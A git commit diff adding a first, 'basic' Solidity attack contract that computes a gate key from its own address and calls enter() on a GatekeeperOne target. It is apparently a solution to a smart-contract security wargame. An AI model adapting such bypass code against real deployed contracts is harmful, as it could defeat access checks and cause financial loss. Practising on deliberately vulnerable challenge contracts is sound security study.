e9a068198716f7404859d2799b2028457f8b48bd
Joe Jordan <dev@ignitesoft.com>
2022-08-27 16:04:00 -0400

    basic attack contract

--- src/GatekeeperOne/GatekeeperOneAttack.sol
+++ src/GatekeeperOne/GatekeeperOneAttack.sol
@@ -1,6 +1,13 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
+import { GatekeeperOne } from "src/GatekeeperOne/GatekeeperOne.sol";
+
+import { toBytes } from "src/utils/toBytes.sol";
+
 contract GatekeeperOneAttack {
-    // stub
+    function attack(address targetAddress) external {
+        bytes8 gateKey = bytes8(toBytes(uint16(uint160(address(this)))));
+        GatekeeperOne(targetAddress).enter(gateKey);
+    }
 }
